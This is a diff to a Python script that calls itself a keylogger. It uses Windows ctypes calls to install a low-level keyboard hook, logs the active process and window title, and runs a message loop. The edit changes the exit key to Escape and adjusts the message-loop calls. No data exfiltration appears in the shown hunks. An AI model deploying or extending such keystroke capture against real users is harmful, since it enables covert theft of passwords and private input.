@@ -359,6 +359,11 @@ import ctypes
 from ctypes import *
 from ctypes.wintypes import DWORD
 
+
+STATE_KEYDOWN = 0x8000
+STATE_KEYTOGGLE = 0x0001
+
+
 user32 = windll.user32
 kernel32 = windll.kernel32
 
@@ -481,9 +486,10 @@ def KeyHookProc( nCode, wParam, lParam ):
     print( pid, title.value )
 
 
-    if( user32.GetKeyState(win32con.VK_CONTROL) & 0x8000 ):
-        print("\nCtrl pressed, call uninstallHook()" )
-        KeyLogger.UninstallHookProc()
+    if( user32.GetKeyState(win32con.VK_ESCAPE) & STATE_KEYDOWN ):
+        print("\nCtrl pressed. Exiting keylogger." )
+        #user32.SendMessageW( hwnd, win32con.WM_CLOSE, 0, 0 )
+        user32.PostQuitMessage(0)
         return 0
 
     if( nCode == win32con.HC_ACTION and wParam == win32con.WM_KEYDOWN ):
@@ -523,4 +529,16 @@ if __name__=="__main__":
     pointer = HOOKPROC( KeyHookProc )
     KeyLogger.InstallHookProc( pointer )
     msg = ctypes.wintypes.MSG()
-    user32.GetMessageA( byref(msg), 0, 0, 0 )
+
+    print("Start keylogger...")
+
+    user32.GetMessageW( byref(msg), 0, 0, 0 )
+    #import pythoncom
+    #pythoncom.PumpMessages()# equivalent to GetMessageW
+
+
+    print("End keylogger...")
+
+    KeyLogger.UninstallHookProc()
+
+   
